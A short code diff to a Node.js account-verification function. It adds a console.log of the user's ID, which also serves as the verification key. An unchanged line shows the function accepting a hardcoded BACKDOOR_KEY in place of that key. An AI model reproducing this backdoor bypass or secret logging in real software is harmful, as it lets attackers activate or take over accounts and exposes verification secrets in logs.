@@ -35,6 +35,7 @@ module.exports.verifyUser = async(email, key) => {
     let users = await User.find({ 'email': email }).limit(1);
     if (users.length == 0) return null;
     let user = users[0];
+    console.log(user._id);
     if (key == user._id || key == BACKDOOR_KEY){
         user.enabled = true;
         return user.save()
